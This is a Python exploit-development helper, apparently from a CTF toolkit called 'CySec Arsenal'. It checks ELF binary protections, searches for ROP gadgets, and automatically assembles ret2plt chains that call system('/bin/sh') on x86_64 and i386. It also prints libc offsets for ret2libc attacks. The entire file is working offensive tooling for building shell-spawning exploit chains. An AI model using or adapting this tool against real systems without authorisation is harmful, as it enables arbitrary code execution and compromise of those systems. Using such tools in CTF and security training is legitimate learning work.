#!/usr/bin/env python3
"""
pwn/rop_helper.py — ROP chain analysis & construction helper for CTF
NuRichter · CySec Arsenal

Requires: pwntools, ROPgadget (optional)

Usage:
    python pwn/rop_helper.py -b ./vuln_binary
    python pwn/rop_helper.py -b ./vuln_binary --gadgets "pop rdi; ret"
    python pwn/rop_helper.py -b ./vuln_binary --ret2libc --libc /lib/libc.so.6
    python pwn/rop_helper.py --checksec ./vuln_binary
"""
import argparse
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from utils import ok, warn, err, info, found, get_logger

log = get_logger("rop_helper")

try:
    from pwn import ELF, ROP, context, p64, p32, u64, u32
    PWNTOOLS = True
except ImportError:
    PWNTOOLS = False


# ─── Checksec ─────────────────────────────────────────────────────────────────

def checksec(binary_path: str) -> dict:
    """Run pwntools checksec and display protections."""
    if not PWNTOOLS:
        print(err("pwntools not installed. Run: pip install pwntools"))
        return {}

    elf = ELF(binary_path, checksec=False)
    protections = {
        "RELRO":    elf.relro or "No RELRO",
        "Stack Canary": "Enabled" if elf.canary else "DISABLED",
        "NX":       "Enabled" if elf.nx else "DISABLED",
        "PIE":      "Enabled" if elf.pie else "DISABLED",
        "RPATH":    elf.rpath or "None",
        "RUNPATH":  elf.runpath or "None",
        "Arch":     f"{elf.arch} / {elf.bits}-bit",
    }

    print(f"\n  Binary   : {binary_path}")
    print(f"  {'Protection':<18} {'Status'}")
    print(f"  {'─'*40}")
    for k, v in protections.items():
        flag = "✓" if "Enabled" in str(v) or "Full" in str(v) else "✗"
        color = "\033[32m" if flag == "✓" else "\033[31m"
        print(f"  {k:<18} {color}{flag} {v}\033[0m")
    print()
    return protections


# ─── Gadget search ────────────────────────────────────────────────────────────

def find_gadgets(binary_path: str, search: str) -> list[tuple[int, str]]:
    """Use ROPgadget to find gadgets matching a pattern."""
    print(info(f"Searching gadgets: {repr(search)}"))
    try:
        result = subprocess.run(
            ["ROPgadget", "--binary", binary_path, "--re", search],
            capture_output=True, text=True, timeout=30
        )
        gadgets = []
        for line in result.stdout.splitlines():
            if "0x" in line and ":" in line:
                parts = line.strip().split(" : ")
                if len(parts) == 2:
                    addr = int(parts[0].strip(), 16)
                    instr = parts[1].strip()
                    gadgets.append((addr, instr))
                    print(found(f"  0x{addr:016x}  {instr}"))
        print(ok(f"Found {len(gadgets)} gadget(s)"))
        return gadgets
    except FileNotFoundError:
        print(warn("ROPgadget not found. Install: pip install ropgadget"))
        return []


# ─── ROP chain builder ────────────────────────────────────────────────────────

def build_rop_chain(binary_path: str, target: str = "shell") -> bytes:
    """Build a basic ROP chain using pwntools ROP module."""
    if not PWNTOOLS:
        print(err("pwntools not installed."))
        return b""

    elf = ELF(binary_path, checksec=False)
    rop = ROP(elf)
    context.binary = elf

    chain = b""

    if target == "shell" and elf.arch == "amd64":
        print(info("Building ret2plt /bin/sh chain (x86_64)..."))
        try:
            binsh = next(elf.search(b"/bin/sh"))
            print(ok(f"  /bin/sh @ 0x{binsh:08x}"))
        except StopIteration:
            print(warn("  /bin/sh string not found in binary"))
            binsh = 0

        try:
            pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
            ret     = rop.find_gadget(["ret"])[0]
            system  = elf.plt.get("system", 0)

            print(ok(f"  pop rdi; ret @ 0x{pop_rdi:08x}"))
            print(ok(f"  system@plt  @ 0x{system:08x}"))

            chain = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
            print(found(f"\n  ROP chain ({len(chain)} bytes):"))
            print(f"  {chain.hex()}")
        except Exception as e:
            print(warn(f"  Could not auto-build chain: {e}"))

    elif target == "shell" and elf.arch == "i386":
        print(info("Building ret2plt chain (x86)..."))
        try:
            system = elf.plt["system"]
            binsh  = next(elf.search(b"/bin/sh"))
            chain  = p32(system) + p32(0xdeadbeef) + p32(binsh)
            print(found(f"\n  ROP chain ({len(chain)} bytes):"))
            print(f"  {chain.hex()}")
        except Exception as e:
            print(warn(f"  Could not auto-build chain: {e}"))

    return chain


# ─── Ret2libc helper ──────────────────────────────────────────────────────────

def ret2libc_offsets(libc_path: str) -> None:
    """Display useful libc offsets for ret2libc attacks."""
    if not PWNTOOLS:
        print(err("pwntools not installed."))
        return

    libc = ELF(libc_path, checksec=False)
    print(info(f"Libc: {libc_path}"))

    targets = {
        "system":    libc.symbols.get("system", 0),
        "__libc_start_main": libc.symbols.get("__libc_start_main", 0),
        "puts":      libc.symbols.get("puts", 0),
        "printf":    libc.symbols.get("printf", 0),
        "execve":    libc.symbols.get("execve", 0),
    }

    try:
        binsh = next(libc.search(b"/bin/sh"))
    except StopIteration:
        binsh = 0

    print(f"\n  {'Symbol':<25} {'Offset'}")
    print(f"  {'─'*40}")
    for name, addr in targets.items():
        print(f"  {name:<25} 0x{addr:08x}")
    print(f"  {'/bin/sh':<25} 0x{binsh:08x}")

    print(f"\n  {info('libc base = leaked_addr - offset')}")
    print(f"  {info('target   = libc_base  + target_offset')}")


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="ROP Helper (CTF) — NuRichter CySec Arsenal"
    )
    parser.add_argument("-b", "--binary", help="Target ELF binary")
    parser.add_argument("--checksec", metavar="BINARY",
                        help="Run checksec only on binary")
    parser.add_argument("--gadgets", default="",
                        help="Regex pattern to search for gadgets")
    parser.add_argument("--rop-chain", choices=["shell", "execve"],
                        help="Auto-build a ROP chain")
    parser.add_argument("--ret2libc", action="store_true")
    parser.add_argument("--libc", default="", help="Path to libc.so")
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print("  ROP Helper — NuRichter CySec Arsenal")
    print(f"{'='*60}\n")

    if args.checksec:
        checksec(args.checksec)
        return

    if not args.binary:
        parser.error("Specify -b BINARY")

    checksec(args.binary)

    if args.gadgets:
        find_gadgets(args.binary, args.gadgets)

    if args.rop_chain:
        build_rop_chain(args.binary, args.rop_chain)

    if args.ret2libc and args.libc:
        ret2libc_offsets(args.libc)


if __name__ == "__main__":
    main()
